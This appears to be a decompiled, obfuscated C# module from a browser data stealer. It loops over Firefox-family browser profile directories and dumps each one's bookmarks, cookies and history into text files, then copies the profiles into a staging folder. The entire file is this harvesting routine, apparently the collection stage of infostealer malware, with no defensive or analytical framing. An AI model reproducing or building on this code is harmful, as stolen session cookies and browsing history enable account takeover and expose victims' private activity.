using System;
using System.Collections.Generic;
using System.IO;
using ns13;
using ns8;

namespace ns10;

internal sealed class Class35
{
	public static void smethod_0(string string_0)
	{
		string[] string_ = Class55.string_1;
		foreach (string text in string_)
		{
			try
			{
				string name = new DirectoryInfo(text).Name;
				string text2 = string_0 + "\\" + name;
				if (Directory.Exists(Class55.string_3 + text + "\\Profiles"))
				{
					Directory.CreateDirectory(text2);
					List<Struct6> list_ = Class33.smethod_1(Class55.string_3 + text);
					List<Struct2> list_2 = Class34.smethod_1(Class55.string_3 + text);
					List<Struct5> list_3 = Class36.smethod_1(Class55.string_3 + text);
					Class30.smethod_9(list_, text2 + "\\Bookmarks.txt");
					Class30.smethod_6(list_2, text2 + "\\Cookies.txt");
					Class30.smethod_8(list_3, text2 + "\\History.txt");
					Class37.smethod_1(Class55.string_3 + text + "\\Profiles\\", text2);
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
	}
}
